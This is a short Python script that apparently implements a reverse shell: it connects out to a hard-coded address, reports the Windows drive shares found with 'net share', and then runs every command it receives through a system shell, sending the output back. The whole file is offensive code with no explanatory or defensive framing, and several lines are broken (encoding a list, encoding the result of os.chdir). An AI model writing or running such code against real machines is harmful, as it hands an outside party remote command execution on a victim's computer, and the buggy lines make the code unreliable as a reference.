from socket import *
import subprocess as sub
import os

'''
ip = input("Enter Lhost : ")
port = int(input("Enter Port : "))
'''

s = socket(2,1)
s.connect(("192.168.1.5", 23455))

import subprocess as sub

drivers = ["C:", "D:", "F:", "E:"]
sys_drive = []

cmd = sub.check_output("net share", shell=True).decode()
for i in drivers:
    if i in str(cmd):
        sys_drive.append(i)

s.send(sys_drive.encode())

while True:
    s.send((os.getcwd() + "> ").encode())
    data = (s.recv(1024)).decode()

    if data == "-":
        continue

    elif data[0:2] == "cd":
        try:
            s.send((os.chdir(data[3:]).encode()))
        except:
            s.send(" ".encode())
            continue

    shell_data = sub.Popen(data, shell=True, stdout=sub.PIPE,
                           stderr=sub.PIPE,
                           stdin=sub.PIPE)

    value = shell_data.stdout.read() + shell_data.stderr.read()
    if value == None or value == "":
        s.send("done !".encode())
        continue
    s.send(value)

s.close()
